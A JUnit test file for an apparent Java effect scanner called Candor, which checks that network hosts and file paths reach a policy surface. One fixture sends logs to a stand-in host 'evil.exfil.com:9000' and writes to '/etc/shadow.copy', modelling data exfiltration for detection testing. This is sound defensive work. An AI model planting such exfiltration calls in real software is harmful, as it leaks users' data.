package io.poly.candor;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.util.Map;
import java.util.TreeSet;
import java.util.stream.Stream;
import org.junit.jupiter.api.Assumptions;
import org.junit.jupiter.api.Test;

/**
 * Round-15 teeth: the logging-handler literal-surface EVASION fix (SocketHandler host / FileHandler path must
 * reach the AS-EFF-008 surface), the method-ref/ctor-ref &lt;clinit&gt; silent-pure, and the new framework
 * roots (Spring OncePerRequestFilter, GCP Cloud Functions) + a decoy.
 */
class Round15FixesTest {

    private static Path compile(Map<String, String> sources) throws Exception {
        javax.tools.JavaCompiler jc = javax.tools.ToolProvider.getSystemJavaCompiler();
        Assumptions.assumeTrue(jc != null, "no system Java compiler — skip");
        Path dir = Files.createTempDirectory("candor-r15");
        List<String> files = new ArrayList<>();
        for (Map.Entry<String, String> e : sources.entrySet()) {
            Path p = dir.resolve(e.getKey());
            Files.createDirectories(p.getParent());
            Files.writeString(p, e.getValue());
            files.add(p.toString());
        }
        Path out = dir.resolve("cls");
        Files.createDirectories(out);
        List<String> args = new ArrayList<>(List.of("-d", out.toString()));
        args.addAll(files);
        assertEquals(0, jc.run(null, null, null, args.toArray(new String[0])), "fixture must compile");
        return out;
    }

    private static void rm(Path dir) throws Exception {
        try (Stream<Path> s = Files.walk(dir)) {
            s.sorted(Comparator.reverseOrder()).forEach(p -> p.toFile().delete());
        }
    }

    /** A SocketHandler(host,port) host and a FileHandler(path) path must reach the AS-EFF-008 surface — else
     *  a forbidden exfil host/path is invisible and a benign co-located literal masks it (gate evasion). */
    @Test
    void loggingHandlerHostAndPathSurfaced() throws Exception {
        Path cls = compile(Map.of("app/A.java", String.join("\n",
            "package app;",
            "import java.util.logging.*;",
            "public class A {",
            "  void net() throws Exception { new SocketHandler(\"evil.exfil.com\", 9000).publish(null); }",
            "  void fs() throws Exception { new FileHandler(\"/etc/shadow.copy\").publish(null); }",
            "}")));
        try {
            Map<String, TreeSet<String>> r = Candor.runScan(cls);
            assertTrue(r.getOrDefault("app.A.net", new TreeSet<>()).contains("Net"), "SocketHandler is Net");
            assertTrue(Candor.hostsDirect.getOrDefault("app.A.net", new TreeSet<>()).contains("evil.exfil.com:9000"),
                    "the SocketHandler host must be surfaced, got " + Candor.hostsDirect.get("app.A.net"));
            assertTrue(r.getOrDefault("app.A.fs", new TreeSet<>()).contains("Fs"), "FileHandler is Fs");
            assertTrue(Candor.pathsDirect.getOrDefault("app.A.fs", new TreeSet<>()).contains("/etc/shadow.copy"),
                    "the FileHandler path must be surfaced, got " + Candor.pathsDirect.get("app.A.fs"));
        } finally { rm(cls.getParent()); }
    }

    /** A static method-ref / ctor-ref to a class with an effectful <clinit> (but a pure referenced body)
     *  triggers the class load → its <clinit> effect must reach the use site. */
    @Test
    void methodRefTriggersClinit() throws Exception {
        Path cls = compile(Map.of("app/A.java", String.join("\n",
            "package app;",
            "import java.util.function.*;",
            "public class A {",
            "  static class H { static { try{new java.net.Socket(\"h\",80).close();}catch(Exception e){} }",
            "                   static String doNothing(){ return null; } }",
            "  Supplier<String> use(){ return H::doNothing; }",   // ref triggers H.<clinit> (Net)
            "}")));
        try {
            Map<String, TreeSet<String>> r = Candor.runScan(cls);
            assertTrue(r.getOrDefault("app.A.use", new TreeSet<>()).contains("Net"),
                    "a method-ref must trigger the class's <clinit> effect, got " + r.get("app.A.use"));
        } finally { rm(cls.getParent()); }
    }

    /** Spring OncePerRequestFilter.doFilterInternal + GCP HttpFunction.service are container-invoked roots;
     *  a non-implementor decoy is NOT rooted. */
    @Test
    void newFrameworkRootsRooted() throws Exception {
        Path cls = compile(Map.ofEntries(
            Map.entry("jakarta/servlet/Filter.java", "package jakarta.servlet; public interface Filter {}"),
            Map.entry("org/springframework/web/filter/OncePerRequestFilter.java",
                "package org.springframework.web.filter; public abstract class OncePerRequestFilter implements jakarta.servlet.Filter { protected abstract void doFilterInternal(Object req, Object resp, Object chain); }"),
            Map.entry("com/google/cloud/functions/HttpFunction.java",
                "package com.google.cloud.functions; public interface HttpFunction { void service(Object req, Object resp); }"),
            Map.entry("app/A.java", String.join("\n",
                "package app;",
                "class F extends org.springframework.web.filter.OncePerRequestFilter {",
                "  protected void doFilterInternal(Object req, Object resp, Object chain){ try{new java.net.Socket(\"h\",80).close();}catch(Exception e){} } }",
                "class Fn implements com.google.cloud.functions.HttpFunction {",
                "  public void service(Object req, Object resp){ try{new java.net.Socket(\"h\",80).close();}catch(Exception e){} } }",
                "class NotAFilter { public void doFilterInternal(Object req, Object resp, Object chain){ try{new java.net.Socket(\"h\",80).close();}catch(Exception e){} } }",
                "public class A {}"))));
        try {
            Candor.runScan(cls);
            assertTrue(Candor.entryPoints.contains("app.F.doFilterInternal"), "OncePerRequestFilter must be rooted");
            assertTrue(Candor.entryPoints.contains("app.Fn.service"), "GCP HttpFunction must be rooted");
            assertFalse(Candor.entryPoints.contains("app.NotAFilter.doFilterInternal"),
                    "a non-implementor doFilterInternal must NOT be over-rooted");
        } finally { rm(cls.getParent()); }
    }
}
